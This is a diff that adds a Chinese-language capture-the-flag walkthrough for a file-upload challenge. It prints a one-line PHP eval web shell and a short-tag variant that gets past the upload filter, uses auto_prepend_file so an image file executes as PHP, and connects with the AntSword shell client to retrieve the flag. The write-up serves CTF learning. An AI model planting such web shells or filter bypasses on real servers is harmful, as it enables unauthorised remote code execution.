@@ -891,6 +891,38 @@ auto_prepend_file=a.jpg
 
 接下来就是上传包含一句话木马并且文件名为a.jpg的文件
 
+![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111511926.webp)
 
+然后在浏览器打开F12，选择到网络那一的选项之后再放包
 
+![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111513804.webp)
 
+好家伙还是上传失败了，说明他存在检测一句话木马。
+
+那就把`<?php eval($_REQUEST[8]); ?>`改成`<?= eval($_REQUEST[8]); ?>`
+
+![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111516440.webp)
+
+改完之后成功上传
+
+这个时候直接看F12里的包，而不是直接去连路径
+
+![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111517950.webp)
+
+可以看到这里出现乱码了，说明我们上传的图片成功的被当作php执行了，这个时候就可以打开蚁剑直接连接这个页面的url
+
+连接蚁剑的速度要快，否则很快图马就会被删除得重新上传
+
+![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111521986.webp)
+
+连接成功
+
+flag的位置：
+
+![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111521398.webp)
+
+![Img](https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202305111522804.webp)
+
+<br />
+
+注：这题的flag是会变化的，连接后flag会立即刷新并且一旦提交flag后webshell会马上失效
